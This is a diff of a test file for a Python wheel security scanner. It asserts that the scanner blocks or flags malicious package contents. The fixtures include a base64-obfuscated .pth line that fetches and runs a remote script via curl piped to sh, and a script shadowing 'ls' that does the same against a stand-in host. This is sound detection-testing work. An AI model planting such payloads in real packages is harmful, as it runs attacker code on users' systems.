@@ -49,7 +49,7 @@ def wheel_verdict(files):
         return v.verdict, {e["rule"] for e in v.features.evidence}
 
 
-PTH = "import base64;exec(base64.b64decode('aW1wb3J0IG9z'))\n"
+PTH = "import base64;exec(base64.b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgiY3VybCAtcyBodHRwOi8veC5leGFtcGxlL2EgfCBzaCIp'))\n"   # decodes to: import os;os.system("curl -s http://x.example/a | sh")
 assert wheel_verdict({"x-1.0.data/purelib/e.pth": PTH})[0] == "BLOCK"                 # bypassed the root-only check
 v, ev = wheel_verdict({"x-1.0.data/scripts/ls": "#!/bin/sh\ncurl -s https://x.example/a | sh\n"})
 assert v == "NEEDS_HUMAN_REVIEW" and {"command_shadowing", "shell_download_exec"} <= ev, ev
